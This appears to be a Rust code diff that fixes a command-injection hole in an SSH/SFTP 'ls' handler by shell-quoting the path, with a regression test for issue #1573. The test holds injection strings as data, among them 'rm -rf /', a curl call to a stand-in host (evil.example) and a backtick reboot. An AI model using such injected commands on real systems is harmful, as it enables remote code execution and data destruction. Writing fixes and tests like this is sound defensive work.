@@ -564,7 +564,7 @@ async fn execute_sftp(
             }
             Some("ls") => {
                 let path = parts.get(1).copied().unwrap_or(".");
-                let cmd = format!("ls -la {}", path);
+                let cmd = build_sftp_ls_cmd(path);
                 match ssh_client.exec(&target, &cmd).await {
                     Ok(result) => {
                         output.push_str(&result.stdout);
@@ -628,6 +628,20 @@ fn parse_remote_path(spec: &str) -> Option<(String, String)> {
     None
 }
 
+/// Shell-escape a string for safe interpolation into a remote command.
+/// Wraps in single quotes and escapes embedded single quotes.
+#[cfg(feature = "ssh")]
+fn shell_escape(s: &str) -> String {
+    format!("'{}'", s.replace('\'', "'\\''"))
+}
+
+// Path is shell-escaped to prevent SFTP `ls` from injecting commands into the
+// remote shell via metacharacters (TM-SSH RCE — issue #1573).
+#[cfg(feature = "ssh")]
+fn build_sftp_ls_cmd(path: &str) -> String {
+    format!("ls -la {}", shell_escape(path))
+}
+
 /// Build an ExecResult from SSH output.
 #[cfg(feature = "ssh")]
 fn build_result(output: super::SshOutput, _quiet: bool) -> ExecResult {
@@ -676,6 +690,25 @@ mod tests {
         let (user, host) = parse_user_host("db.supabase.co", &config);
         assert_eq!(user, "root");
         assert_eq!(host, "db.supabase.co");
+    }
+
+    #[test]
+    #[cfg(feature = "ssh")]
+    fn test_sftp_ls_quotes_metacharacters() {
+        // Regression: issue #1573. Path must be single-quoted so remote
+        // shell never sees ; | & $ ` etc. as separators.
+        assert_eq!(build_sftp_ls_cmd("."), "ls -la '.'");
+        assert_eq!(build_sftp_ls_cmd("/tmp"), "ls -la '/tmp'");
+        assert_eq!(
+            build_sftp_ls_cmd("/tmp; rm -rf /"),
+            "ls -la '/tmp; rm -rf /'"
+        );
+        assert_eq!(
+            build_sftp_ls_cmd("$(curl evil.example/x)"),
+            "ls -la '$(curl evil.example/x)'"
+        );
+        assert_eq!(build_sftp_ls_cmd("`reboot`"), "ls -la '`reboot`'");
+        assert_eq!(build_sftp_ls_cmd("a'b"), "ls -la 'a'\\''b'");
     }
 
     #[test]
